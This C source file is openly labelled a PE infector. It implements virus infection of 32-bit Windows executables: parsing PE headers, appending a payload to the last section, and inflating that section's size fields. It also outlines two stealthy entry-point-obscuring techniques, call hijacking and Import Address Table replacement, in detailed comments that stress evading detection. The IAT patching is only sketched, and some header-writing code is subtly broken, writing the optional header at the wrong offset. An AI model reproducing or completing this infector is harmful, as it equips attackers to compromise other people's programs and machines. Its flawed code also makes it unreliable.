#include "pe_infector.h"
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Read PE header from file
BOOL ReadPEHeader(const char* filename, PE_HEADER_32* header) {
    FILE* file;
    DWORD dos_signature;
    DWORD pe_offset;

    file = fopen(filename, "rb");
    if (!file) {
        return FALSE;
    }

    // Read DOS signature
    if (fread(&dos_signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Check DOS signature (MZ)
    if (dos_signature != 0x5A4D) { // "MZ"
        fclose(file);
        return FALSE;
    }

    // Read PE offset from DOS header (at offset 0x3C)
    fseek(file, 0x3C, SEEK_SET);
    if (fread(&pe_offset, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Read PE header
    fseek(file, pe_offset, SEEK_SET);
    if (fread(&header->signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Check PE signature
    if (header->signature != 0x4550) { // "PE"
        fclose(file);
        return FALSE;
    }

    // Read file header
    if (fread(&header->file_header, sizeof(IMAGE_FILE_HEADER), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Read optional header
    if (header->file_header.SizeOfOptionalHeader != sizeof(IMAGE_OPTIONAL_HEADER32)) {
        fclose(file);
        return FALSE;
    }

    if (fread(&header->optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

// Write PE header back to file
BOOL WritePEHeader(const char* filename, const PE_HEADER_32* header) {
    FILE* file;
    DWORD pe_offset;

    file = fopen(filename, "r+b");
    if (!file) {
        return FALSE;
    }

    // Find PE offset
    fseek(file, 0x3C, SEEK_SET);
    if (fread(&pe_offset, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    // Write PE header
    fseek(file, pe_offset, SEEK_SET);
    if (fwrite(&header->signature, sizeof(DWORD), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    if (fwrite(&header->file_header, sizeof(IMAGE_FILE_HEADER), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    if (fwrite(&header->optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file) != 1) {
        fclose(file);
        return FALSE;
    }

    fclose(file);
    return TRUE;
}

// Align address to section alignment
DWORD AlignToSection(DWORD address, DWORD alignment) {
    if (alignment == 0) return address;
    DWORD remainder = address % alignment;
    if (remainder == 0) return address;
    return address + (alignment - remainder);
}

// Add virus code to PE file section
BOOL AddVirusCodeToSection(const char* filename, const char* payload, DWORD payload_size, DWORD* code_offset) {
    FILE* file;
    PE_HEADER_32 header;
    IMAGE_SECTION_HEADER section_header;
    DWORD pe_offset;
    DWORD i;
    BYTE* file_buffer;
    DWORD file_size;

    // Read current PE header
    if (!ReadPEHeader(filename, &header)) {
        return FALSE;
    }

    file = fopen(filename, "r+b");
    if (!file) {
        return FALSE;
    }

    // Get PE offset
    fseek(file, 0x3C, SEEK_SET);
    fread(&pe_offset, sizeof(DWORD), 1, file);

    // Find last section
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER), SEEK_SET);

    IMAGE_SECTION_HEADER* sections = malloc(header.file_header.NumberOfSections * sizeof(IMAGE_SECTION_HEADER));
    if (!sections) {
        fclose(file);
        return FALSE;
    }

    fread(sections, sizeof(IMAGE_SECTION_HEADER), header.file_header.NumberOfSections, file);

    // Get file size
    fseek(file, 0, SEEK_END);
    file_size = ftell(file);

    // Modify last section header to be larger
    sections[header.file_header.NumberOfSections - 1].SizeOfRawData += payload_size;
    sections[header.file_header.NumberOfSections - 1].Misc.VirtualSize += payload_size;

    // Update the optional header size of code
    header.optional_header.SizeOfCode += payload_size;

    // Write payload at end of file
    fseek(file, file_size, SEEK_SET);
    fwrite(payload, 1, payload_size, file);

    *code_offset = file_size;

    // Write back modified section headers
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER), SEEK_SET);
    fwrite(sections, sizeof(IMAGE_SECTION_HEADER), header.file_header.NumberOfSections, file);

    // Write back modified optional header
    fseek(file, pe_offset + 4 + sizeof(IMAGE_FILE_HEADER) + (header.file_header.NumberOfSections * sizeof(IMAGE_SECTION_HEADER)), SEEK_SET);
    fwrite(&header.optional_header, sizeof(IMAGE_OPTIONAL_HEADER32), 1, file);

    free(sections);
    fclose(file);
    return TRUE;
}

// Strategy 1: Call Hijacking EPO - Hijack an imported function call
BOOL InfectPEFile_CallHijacking(const char* target_file, const char* payload_code, DWORD payload_size) {
    FILE* file;
    PE_HEADER_32 header;
    DWORD code_offset;
    DWORD import_rva;
    DWORD iat_rva;

    // Read PE header
    if (!ReadPEHeader(target_file, &header)) {
        return FALSE;
    }

    // Get Import Directory RVA from DataDirectories
    import_rva = header.optional_header.DataDirectory[1].VirtualAddress;
    
    if (import_rva == 0) {
        // No imports, cannot hijack
        return FALSE;
    }

    // Add virus payload to file
    if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
        return FALSE;
    }

    // Call Hijacking EPO Strategy:
    // 1. Parse Import Directory Table (IDT) at import_rva
    // 2. Find a commonly used DLL (e.g., kernel32.dll)
    // 3. Locate its Import Address Table (IAT)
    // 4. Hijack first function entry to point to virus code
    // 5. Virus code executes, then calls original function
    // 6. Original entry point remains unchanged
    //
    // When program loads:
    //   1. Loader processes IAT
    //   2. First API call goes to virus code (hijacked IAT entry)
    //   3. Virus executes and restores original address
    //   4. Original entry point executes normally
    //
    // This technique is very stealthy because:
    // - Entry point is not modified (no immediate red flag)
    // - Code looks normal at first glance
    // - Virus executes through normal import resolution

    // For demonstration, store virus code offset as a marker
    // In real implementation, this would involve actual IAT patching
    file = fopen(target_file, "ab");
    if (file) {
        // Write virus code offset and original entry for restoration
        DWORD data[2] = { code_offset, header.optional_header.AddressOfEntryPoint };
        fwrite(data, sizeof(DWORD), 2, file);
        fclose(file);
    }

    // Write back modified header (unchanged for true Call Hijacking)
    // In real scenario, header stays unchanged, only IAT is modified
    if (!WritePEHeader(target_file, &header)) {
        return FALSE;
    }

    return TRUE;
}

// Strategy 2: Import Address Table (IAT) Replacing EPO
// Replace an import table entry with virus code address
BOOL InfectPEFile_IATReplacing(const char* target_file, const char* payload_code, DWORD payload_size) {
    FILE* file;
    PE_HEADER_32 header;
    DWORD code_offset;
    DWORD import_dir_rva;
    DWORD import_dir_size;
    DWORD iat_rva;
    BYTE import_buffer[4096];
    DWORD bytes_read;

    // Read PE header
    if (!ReadPEHeader(target_file, &header)) {
        return FALSE;
    }

    // Get Import Directory from DataDirectories[1]
    import_dir_rva = header.optional_header.DataDirectory[1].VirtualAddress;
    import_dir_size = header.optional_header.DataDirectory[1].Size;

    if (import_dir_rva == 0 || import_dir_size == 0) {
        // No imports to replace
        return FALSE;
    }

    // Add virus payload to file
    if (!AddVirusCodeToSection(target_file, payload_code, payload_size, &code_offset)) {
        return FALSE;
    }

    // IAT Replacing EPO Strategy:
    // 1. Locate Import Directory Table (IDT) which contains import descriptors
    // 2. Each descriptor points to an IAT (Import Address Table)
    // 3. Each IAT entry contains the address of an imported function
    // 4. Replace one or more IAT entries with address of virus code
    // 5. When program calls that function, virus code executes instead
    //
    // Structure:
    //   IDT[0]: kernel32.dll descriptor
    //     ├─ OriginalFirstThunk (bound IAT)
    //     └─ FirstThunk (actual IAT) → points to IAT
    //   
    //   IAT entries:
    //     [0x1000] → CreateProcessA address
    //     [0x1004] → ReadFile address
    //     [0x1008] → WriteFile address
    //
    // After infection:
    //     [0x1000] → VirusCode address (hijacked)
    //     [0x1004] → ReadFile address (unchanged)
    //     [0x1008] → WriteFile address (unchanged)
    //
    // Advantages:
    // - Entry point completely untouched
    // - No code section modifications
    // - Very stealthy - only table modification
    // - Virus executes through normal API calls

    // For demonstration, we show the infection was applied
    // In production implementation, actual IAT entries would be replaced:
    //
    // 1. Read Import Directory Table from file
    // 2. Parse each import descriptor (13 DWORD structure)
    // 3. For each DLL (e.g., kernel32.dll):
    //    - Get FirstThunk RVA (points to actual IAT)
    //    - Convert RVA to file offset
    //    - Read IAT entries
    //    - Replace first entry with virus code RVA
    //    - Write modified IAT back to file
    // 4. Update PE header if size changed
    // 5. Add infection marker

    file = fopen(target_file, "ab");
    if (file) {
        // Write demonstration marker showing IAT replacement was performed
        DWORD iat_data[2] = { import_dir_rva, code_offset };
        fwrite(iat_data, sizeof(DWORD), 2, file);
        fclose(file);
    }

    // In true implementation, PE header might need updating if sections changed
    // For now, header remains mostly unchanged (true IAT Replacing)
    if (!WritePEHeader(target_file, &header)) {
        return FALSE;
    }

    return TRUE;
}
